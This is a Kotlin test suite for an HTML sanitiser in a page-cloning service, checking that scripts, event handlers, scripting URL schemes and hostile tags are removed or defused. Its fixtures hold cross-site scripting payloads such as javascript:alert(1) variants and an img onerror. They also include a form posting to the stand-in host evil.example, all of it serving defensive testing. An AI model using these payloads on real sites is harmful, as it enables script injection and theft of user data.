package dev.vibemotion.api.clone

import io.kotest.assertions.throwables.shouldThrow
import io.kotest.assertions.withClue
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.nulls.shouldNotBeNull
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.string.shouldNotContain
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path

/**
 * The sanitiser on its own. [HtmlRewriterTest] already proves it does not change what a clone
 * produces; these are the guarantees the *exporter* relies on, where there is no CSP behind it
 * (DT-073), plus the three things the sanitiser deliberately does not do.
 */
class HtmlSanitiserTest :
    FunSpec({

        val sanitiser = HtmlSanitiser()

        fun sanitised(html: String): Document {
            val document = Jsoup.parse(html)
            document.outputSettings().prettyPrint(false).charset(StandardCharsets.UTF_8)
            sanitiser.sanitise(document)
            return document
        }

        test("promotes noscript content, because that is the page without its scripts") {
            val document = sanitised("<html><body><noscript><p class=fallback>JavaScript is off</p></noscript></body></html>")

            document.select("noscript").size shouldBe 0
            document.selectFirst("p.fallback").shouldNotBeNull().text() shouldBe "JavaScript is off"
        }

        test("re-parses noscript content that arrived as one text node of markup") {
            // Some parses hand `<noscript>` back as text; its elements must still be cleaned.
            val document = sanitised("<html><head><noscript>&lt;img src=x onerror=alert(1)&gt;</noscript></head><body></body></html>")

            document.outerHtml() shouldNotContain "onerror"
        }

        test("strips every comment, contents and all") {
            val document =
                sanitised(
                    "<!-- <head> --><html><head><!--[if lt IE 9]><script src=/ie.js></script><![endif]--></head>" +
                        "<body><p>keep me</p><!-- </body --></body></html>",
                )
            val html = document.outerHtml()

            html shouldNotContain "<!--"
            html shouldNotContain "ie.js"
            html shouldContain "keep me"
        }

        test("removes every element that can execute or re-root the document") {
            val document =
                sanitised(
                    "<html><head><base href=https://evil.example/></head><body><script>alert(1)</script>" +
                        "<iframe src=x></iframe><object data=x></object><embed src=x><applet code=x></applet><p>keep</p></body></html>",
                )

            document.select("script, iframe, frame, object, embed, applet, base").size shouldBe 0
            document.selectFirst("p").shouldNotBeNull().text() shouldBe "keep"
        }

        test("removes meta refresh, meta CSP and the preload family of links") {
            val document =
                sanitised(
                    """
                    <html><head>
                      <meta http-equiv="refresh" content="0;url=https://evil.example/">
                      <meta http-equiv="Content-Security-Policy" content="default-src *">
                      <link rel="preload" href="/a.js" as="script">
                      <link rel="dns-prefetch" href="//evil.example">
                      <link rel="manifest" href="/m.json">
                      <link rel="icon" href="/favicon.ico">
                    </head><body></body></html>
                    """.trimIndent(),
                )

            document.select("meta[http-equiv]").size shouldBe 0
            document.outerHtml() shouldNotContain "Content-Security-Policy"
            document.select("link[rel=preload], link[rel=dns-prefetch], link[rel=manifest]").size shouldBe 0
            document.selectFirst("link[rel=icon]").shouldNotBeNull().attr("href") shouldBe "/favicon.ico"
        }

        test("removes SMIL that retargets a URL or carries a scripting scheme, and keeps one that only moves pixels") {
            val document =
                sanitised(
                    """
                    <html><body><svg>
                      <a href="#"><animate attributeName="href" to="https://evil.example/"></animate></a>
                      <set attributeName="fill" to="javascript:alert(1)"></set>
                      <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"></animateTransform>
                    </svg></body></html>
                    """.trimIndent(),
                )

            document.select("animate, set").size shouldBe 0
            document.selectFirst("animatetransform").shouldNotBeNull().attr("type") shouldBe "rotate"
        }

        test("removes every event handler and takes the data-vm- namespace back") {
            val document =
                sanitised(
                    """<html><body><div onclick="x()" ONMOUSEOVER="y()" data-vm-id="vm-9" data-vm-note="n" data-keep="k">hi</div></body></html>""",
                )
            val div = document.selectFirst("div").shouldNotBeNull()

            div.hasAttr("onclick") shouldBe false
            div.hasAttr("ONMOUSEOVER") shouldBe false
            div.hasAttr("data-vm-id") shouldBe false
            div.hasAttr("data-vm-note") shouldBe false
            div.attr("data-keep") shouldBe "k"
        }

        test("removes ping, which is a POST to a third party on every click") {
            val document =
                sanitised(
                    """<html><body><a href="/ok" ping="https://evil.example/t">ok</a>""" +
                        """<area href="/ok2" ping="https://evil.example/t"></body></html>""",
                )

            document.select("[ping]").size shouldBe 0
            document.selectFirst("a").shouldNotBeNull().attr("href") shouldBe "/ok"
        }

        test("defuses scripting schemes in navigation attributes, however they are written") {
            val document =
                sanitised(
                    """
                    <html><body>
                      <a id="plain" href="javascript:alert(1)">a</a>
                      <a id="mixed" href="JaVaScRiPt:alert(1)">b</a>
                      <a id="escaped" href="java&#9;script:alert(1)">c</a>
                      <a id="vb" href="vbscript:msgbox(1)">d</a>
                      <a id="datahtml" href="data:text/html,<script>alert(1)</script>">e</a>
                      <button id="fa" formaction="javascript:alert(1)">f</button>
                      <svg><use id="use" xlink:href="javascript:alert(1)"></use></svg>
                    </body></html>
                    """.trimIndent(),
                )

            listOf("plain", "mixed", "escaped", "vb", "datahtml").forEach { id ->
                withClue(id) { document.selectFirst("#$id").shouldNotBeNull().attr("href") shouldBe "#" }
            }
            document.selectFirst("#fa").shouldNotBeNull().attr("formaction") shouldBe "#"
            document.selectFirst("#use").shouldNotBeNull().attr("xlink:href") shouldBe "#"
        }

        test("defuses a scripting url() in a style attribute and in a style block") {
            val document =
                sanitised(
                    """
                    <html><head><style>a { background: url(javascript:alert(1)); color: red }</style></head>
                    <body><div style="background: url(   javascript:alert(1))">x</div></body></html>
                    """.trimIndent(),
                )
            val html = document.outerHtml()

            html shouldNotContain "javascript:"
            document.selectFirst("div").shouldNotBeNull().attr("style") shouldContain """url("#")"""
            document.selectFirst("style").shouldNotBeNull().data() shouldContain """url("#")"""
        }

        test("keeps forms but disarms them") {
            val form =
                sanitised(
                    """<html><body><form action="https://evil.example/collect" method="post" target="_top"><input name="email"></form></body></html>""",
                ).selectFirst("form")

            form.shouldNotBeNull()
            form.attr("action") shouldBe "#"
            form.hasAttr("target") shouldBe false
            form.attr("method") shouldBe "post"
            form.selectFirst("input").shouldNotBeNull().attr("name") shouldBe "email"
        }

        test("is base-free: no URL is resolved, no stylesheet is inlined, no id is assigned, no charset is added") {
            val document =
                sanitised(
                    """<html><head><link rel="stylesheet" href="/site.css"></head><body><a href="/docs">d</a><img src="img/a.png"></body></html>""",
                )

            document.selectFirst("a").shouldNotBeNull().attr("href") shouldBe "/docs"
            document.selectFirst("img").shouldNotBeNull().attr("src") shouldBe "img/a.png"
            // The link is still a link: inlining it needs a fetcher, which the sanitiser has not got.
            document.selectFirst("link[rel=stylesheet]").shouldNotBeNull().attr("href") shouldBe "/site.css"
            document.select("style[data-vm-source]").size shouldBe 0
            document.select("[data-vm-id]").size shouldBe 0
            document.select("meta[charset]").size shouldBe 0
        }

        test("is idempotent: sanitising its own output changes nothing") {
            val hostile = fixture("hostile.html")
            val once = sanitised(hostile)
            val twice = sanitised(once.outerHtml())

            twice.outerHtml() shouldBe once.outerHtml()
        }

        test("a document that was already sanitised keeps every class attribute exactly as written") {
            val document = sanitised("""<html><body><div class="a  b   c">x</div></body></html>""")

            document.selectFirst("div").shouldNotBeNull().attr("class") shouldBe "a  b   c"
        }

        test("stops at the deadline rather than running every stage") {
            var remaining = 1
            val expiring = DeadlineCheck { if (remaining-- <= 0) throw CloneException.Unreachable("timed out") }

            shouldThrow<CloneException.Unreachable> {
                sanitiser.sanitise(Jsoup.parse(fixture("hostile.html")), expiring)
            }
        }
    })

private fun fixture(name: String): String = Files.readString(Path.of("src/test/resources/clone", name))
